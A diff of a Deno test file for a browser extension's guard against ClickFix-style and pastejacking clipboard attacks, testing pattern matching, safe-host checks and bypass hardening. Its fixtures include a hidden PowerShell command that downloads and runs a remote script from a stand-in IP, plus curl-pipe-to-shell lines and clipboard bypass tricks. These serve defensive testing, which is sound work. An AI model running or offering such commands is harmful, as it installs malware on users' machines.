@@ -7,10 +7,11 @@ import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
 import popupsSource from "../src/guards/popups.js" with { type: "text" };
 import updateSource from "../src/general/update.js" with { type: "text" };
 import manifest from "../manifest.json" with { type: "json" };
+import { unwrapMain } from "./fixtures/main-source.mjs";
 function assert(c, l) { if (!c) throw new Error(l); }
 const F = globalThis.GeckoFeatures;
-const loadClip = () => { const api = {}; new Function(`${clipboardSource}\nreturn installClipboardGuard;`)()(api); return api; };
-const loadPop = () => { const api = {}; new Function(`${popupsSource}\nreturn installPopupGuard;`)()(api); return api; };
+const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };
+const loadPop = () => { const api = {}; new Function(`${unwrapMain(popupsSource)}\nreturn installPopupGuard;`)()(api); return api; };
 
 const DANGEROUS = [
   "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1' -UseBasicParsing)\"",
@@ -52,18 +53,30 @@ Deno.test("clipboard guard patterns: ClickFix-style commands match, ordinary sni
   for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
 });
 
-Deno.test("clipboard guard: docs hosts and deliberate copies are allowed", () => {
+Deno.test("clipboard guard: docs hosts and deliberate copies are allowed; a copy label alone is not enough", () => {
   const g = loadClip();
-  for (const h of ["github.com", "docs.github.com", "developer.mozilla.org", "brew.sh", "pkg.readthedocs.io"]) assert(g.onSafeHost(h), h);
-  for (const h of ["github.com.evil.example", "notgithub.com", "captcha-verify.example"]) assert(!g.onSafeHost(h), h);
-  const el = (attrs, text, parent) => ({ getAttribute: (k) => attrs[k] ?? null, className: attrs.class || "", id: attrs.id || "", textContent: text || "", parentElement: parent || null });
+  for (const h of ["github.com", "docs.github.com", "developer.mozilla.org", "brew.sh"]) assert(g.onSafeHost(h), h);
+  // readthedocs.io / .org: anyone can publish pages and scripts on a subdomain (M-2).
+  for (const h of ["github.com.evil.example", "notgithub.com", "captcha-verify.example", "pkg.readthedocs.io", "evil.readthedocs.org"]) assert(!g.onSafeHost(h), h);
+  const el = (attrs, text, parent, shown) => ({ getAttribute: (k) => attrs[k] ?? null, className: attrs.class || "", id: attrs.id || "", textContent: text || "", innerText: shown ?? text ?? "", parentElement: parent || null });
   const now = 10000;
-  assert(g.deliberateCopy({ kind: "key", at: now - 100, copyKey: true }, now), "Ctrl+C");
-  assert(g.deliberateCopy({ kind: "click", at: now - 100, target: el({ "aria-label": "Copy to clipboard" }) }, now), "copy button");
-  assert(g.deliberateCopy({ kind: "click", at: now - 100, target: el({}, "", el({ class: "btn copy-code" })) }, now), "copy class on a parent");
-  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: el({ id: "recaptcha-anchor" }, "I'm not a robot") }, now), "fake captcha");
-  assert(!g.deliberateCopy({ kind: "click", at: now - 5000, target: el({ "aria-label": "Copy" }) }, now), "stale click");
-  assert(!g.deliberateCopy(null, now), "no input");
+  const cmd = "curl -fsSL https://example.test/install.sh | sh";
+  // Copy shortcut: only for text that was part of the selection at the key press.
+  assert(g.deliberateCopy({ kind: "key", at: now - 100, copyKey: true, sel: "run: " + cmd }, now, cmd), "Ctrl+C on the selected command");
+  assert(!g.deliberateCopy({ kind: "key", at: now - 100, copyKey: true, sel: "some article text" }, now, cmd), "pastejacking: copy handler swaps in a command");
+  assert(!g.deliberateCopy({ kind: "key", at: now - 100, copyKey: false, sel: cmd }, now, cmd), "other key");
+  // Copy button: label AND the text visible next to it.
+  const block = el({ class: "highlight" }, "$ " + cmd + "\nCopy", null);
+  assert(g.deliberateCopy({ kind: "click", at: now - 100, target: el({ "aria-label": "Copy to clipboard" }, "", block) }, now, cmd), "copy button next to its code block");
+  assert(g.deliberateCopy({ kind: "click", at: now - 100, target: el({}, "", el({ class: "btn copy-code" }, "", block)) }, now, cmd), "copy class on a parent");
+  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: el({ "aria-label": "Copy" }, "Copy") }, now, cmd), "copy label alone (text not shown)");
+  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: el({ "aria-label": "Copy" }, "", el({}, "Copy " + cmd, null, "Copy")) }, now, cmd), "text only in hidden markup (innerText lacks it)");
+  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: el({ id: "recaptcha-anchor" }, "I'm not a robot", el({}, "I'm not a robot " + cmd)) }, now, cmd), "fake captcha");
+  assert(!g.deliberateCopy({ kind: "click", at: now - 5000, target: el({ "aria-label": "Copy" }, "", block) }, now, cmd), "stale click");
+  assert(!g.deliberateCopy(null, now, cmd), "no input");
+  // An element whose methods throw counts as "not deliberate" (no fail-open bypass).
+  const evil = { getAttribute() { throw new Error("x"); }, get parentElement() { throw new Error("x"); } };
+  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: evil }, now, cmd), "throwing element");
 });
 
 function fakePage(host, opts = {}) {
@@ -73,23 +86,28 @@ function fakePage(host, opts = {}) {
   let selection = "";
   class Clipboard { writeText(t) { written.push(t); return Promise.resolve(); } }
   const clipboard = new Clipboard();
-  class Doc { execCommand(cmd) { if (cmd === "copy") written.push("exec:" + selection); return true; } }
-  const document = new Doc();
+  // Like Chrome: execCommand lives on Document.prototype, the page object is an HTMLDocument.
+  class Document { execCommand(cmd) { if (cmd === "copy" || cmd === "cut") written.push(cmd + ":" + selection); return true; } }
+  class HTMLDocument extends Document {}
+  const document = new HTMLDocument();
   document.addEventListener = (t, f) => { (listeners[t] ||= []).push(f); };
   document.activeElement = null;
   class DataTransfer { constructor() { this.data = {}; } setData(t, v) { this.data[t] = v; } }
-  const window = { getSelection: () => ({ toString: () => selection }), DataTransfer };
+  class Selection { toString() { return selection; } }
+  const window = { getSelection: () => new Selection(), Selection, DataTransfer, Document };
   const g = loadClip();
   let flag = opts.flag !== undefined ? opts.flag : true;
-  g.install({ window, document, navigator: { clipboard }, location: { hostname: host }, now: () => 1000, notify: (id) => notices.push(id), flagOn: () => { if (flag === "throw") throw new Error("x"); return flag; } });
+  let t = 1000;
+  g.install({ window, document, navigator: { clipboard }, location: { hostname: host }, now: () => t, notify: (id) => notices.push(id), flagOn: () => { if (flag === "throw") throw new Error("x"); return flag; } });
   return {
-    g, written, notices, clipboard, document, window, setFlag: (v) => { flag = v; },
+    g, written, notices, clipboard, document, window, Document, setFlag: (v) => { flag = v; },
     select: (s) => { selection = s; },
+    tick: (ms) => { t += ms; },
     input: (type, e) => { for (const f of listeners[type] || []) f(Object.assign({ isTrusted: true }, e)); },
   };
 }
 
-Deno.test("clipboard guard blocks a page writing a dangerous command (writeText, execCommand copy, copy-event setData) and shows a notice", async () => {
+Deno.test("clipboard guard blocks a page writing a dangerous command (writeText, execCommand copy/cut, copy-event setData) and shows a notice", async () => {
   const p = fakePage("captcha-check.example");
   const bad = DANGEROUS[0];
   let rejected = false;
@@ -99,6 +117,9 @@ Deno.test("clipboard guard blocks a page writing a dangerous command (writeText,
   assert(p.written[0] === "hello there", "benign text still copies");
   p.select(DANGEROUS[5]);
   assert(p.document.execCommand("copy") === false && p.written.length === 1, "execCommand copy of a selected command blocked");
+  assert(p.document.execCommand("cut") === false && p.written.length === 1, "execCommand cut of a selected command blocked");
+  // The native method on Document.prototype is wrapped too (M-2).
+  assert(p.Document.prototype.execCommand.call(p.document, "copy") === false && p.written.length === 1, "Document.prototype.execCommand.call bypass");
   p.select("just some text");
   assert(p.document.execCommand("copy") === true, "normal selection copies");
   const dt = new p.window.DataTransfer();
@@ -108,11 +129,55 @@ Deno.test("clipboard guard blocks a page writing a dangerous command (writeText,
   assert(dt.data["text/plain"] === "fine", "normal setData works");
 });
 
-Deno.test("clipboard guard allows a copy-button click, docs hosts, the switch off, and fails open on errors", async () => {
+Deno.test("clipboard guard coerces once: a value that changes on each toString cannot pass the check and write something else (M-2)", async () => {
+  const p = fakePage("captcha-check.example");
+  const flip = (first, then) => { let n = 0; return { toString: () => (n++ === 0 ? first : then) }; };
+  let rejected = false;
+  await p.clipboard.writeText(flip("harmless text", DANGEROUS[0])).catch(() => { rejected = true; });
+  assert(!rejected && p.written.length === 1 && p.written[0] === "harmless text", "the checked string is the written one: " + JSON.stringify(p.written));
+  const dt = new p.window.DataTransfer();
+  dt.setData("text/plain", flip("fine", DANGEROUS[1]));
+  assert(dt.data["text/plain"] === "fine", "setData writes the checked string");
+  const dt2 = new p.window.DataTransfer();
+  dt2.setData(flip("text/plain", "x-other"), DANGEROUS[1]);
+  assert(dt2.data["text/plain"] === undefined && dt2.data["x-other"] === undefined, "type coerced once too");
+  p.select(DANGEROUS[5]);
+  assert(p.document.execCommand(flip("copy", "copy")) === false, "command coerced once");
+  assert(p.document.execCommand(flip("bold", "copy")) === true && p.written.at(-1) !== "copy:" + DANGEROUS[5], "a 'bold' that turns into 'copy' does not copy");
+});
+
+Deno.test("clipboard guard: copy shortcut and copy button rules in the installed guard", async () => {
+  const cmd = "curl -fsSL https://example.test/install.sh | sh";
+  // Ctrl+C on a selected command: allowed. A copy handler swapping in another command: blocked.
   const p = fakePage("blog.example");
-  p.input("click", { target: { getAttribute: (k) => (k === "aria-label" ? "Copy code" : null), className: "", id: "", textContent: "", parentElement: null } });
-  await p.clipboard.writeText(DANGEROUS[14]);
-  assert(p.written.length === 1, "deliberate copy button");
+  p.select("install with: " + cmd);
+  p.input("keydown", { key: "c", ctrlKey: true });
+  await p.clipboard.writeText(cmd);
+  assert(p.written.length === 1, "copy shortcut on the selection");
+  p.select("an ordinary paragraph");
+  p.input("keydown", { key: "c", ctrlKey: true });
+  let rejected = false;
+  await p.clipboard.writeText(DANGEROUS[14]).catch(() => { rejected = true; });
+  assert(rejected && p.written.length === 1, "pastejacking blocked");
+  // The page changes the selection right after the key press: still the visitor's selection counts.
+  p.select("an ordinary paragraph");
+  p.input("keydown", { key: "c", ctrlKey: true });
+  p.select(DANGEROUS[5]);
+  assert(p.document.execCommand("copy") === false, "selection swapped after the key press");
+  // Copy button: label + the command visible next to it.
+  const q = fakePage("blog.example");
+  const block = { getAttribute: () => null, className: "codeblock", id: "", textContent: cmd, innerText: cmd, parentElement: null };
+  q.input("click", { target: { getAttribute: (k) => (k === "aria-label" ? "Copy code" : null), className: "", id: "", textContent: "", innerText: "", parentElement: block } });
+  await q.clipboard.writeText(cmd);
+  assert(q.written.length === 1, "copy button next to the command");
+  const r = fakePage("blog.example");
+  r.input("click", { target: { getAttribute: (k) => (k === "aria-label" ? "Copy code" : null), className: "", id: "", textContent: "Copy", innerText: "Copy", parentElement: null } });
+  rejected = false;
+  await r.clipboard.writeText(cmd).catch(() => { rejected = true; });
+  assert(rejected && r.written.length === 0, "a copy label alone is not enough");
+});
+
+Deno.test("clipboard guard allows docs hosts and the switch off, and fails open on errors", async () => {
   const docs = fakePage("docs.github.com");
   await docs.clipboard.writeText("curl -fsSL https://example.test/install.sh | sh");
   assert(docs.written.length === 1, "docs host");
